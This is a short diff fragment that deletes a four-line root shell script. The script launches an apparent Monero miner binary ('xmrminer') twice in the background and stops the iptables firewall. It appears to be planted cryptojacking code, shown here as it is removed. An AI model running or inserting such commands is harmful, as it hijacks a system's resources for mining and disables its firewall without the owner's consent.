@@ -1,4 +1,0 @@
-cd  /root/
-./xmrminer&
-./xmrminer&
-/etc/init.d/iptables stop
